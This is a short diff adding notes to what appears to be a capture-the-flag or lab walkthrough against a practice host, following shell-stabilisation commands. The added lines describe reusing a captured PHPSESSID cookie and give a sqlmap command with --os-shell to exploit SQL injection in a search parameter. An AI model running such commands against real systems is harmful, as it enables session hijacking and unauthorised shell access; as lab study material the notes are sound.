@@ -31,3 +31,7 @@ stty raw -echo
 fg
 
 export TERM=xterm
+
+Using known accessed cookie for user login (PHPSESSID), Inject SQL DB
+
+sqlmap -u [http://megacorp.hbt/dashboard.php?search=](http://megacorp.hbt/dashboard.php?search=) --banner --os-shell --cookie=PHPSESSID=7alvo0vrdehj4cafl8u1pccfa1
